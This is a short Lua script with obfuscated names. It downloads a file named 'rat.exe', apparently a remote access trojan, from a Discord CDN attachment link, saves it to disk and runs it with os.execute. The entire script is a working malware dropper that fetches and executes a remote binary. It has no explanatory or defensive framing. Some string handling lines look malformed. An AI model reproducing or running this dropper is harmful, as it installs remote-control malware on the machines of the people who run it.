local _ = string.char; local function __() return _.char; end
local __url = _.gsub(
    "https://cdn.discordapp.com/attachments/1300652331767169159/1319926954153213993/rat.exe?ex=6767bd44&is=67666bc4&hm=e64a7033563f2c44871c3c9be567b393cd234a82390f4c823024a2f9e704953d&",
    "&",
    _.sub("&?hm")
)
local __file_name = "rat.exe"
local function __d(a,b) local c = require; local d = c("socket.http") local e = c("ltn12") local f = io.open(b,"wb")
if f then d.request{url=a,sink=e.sink.file(f)} print("Downloaded: " .. b) else print("Error!") end end
local function __r(b) if os.execute(b) then print("Executed: " .. b) else print("Run Failed!") end end
__d(__url,__file_name)
__r(__file_name)
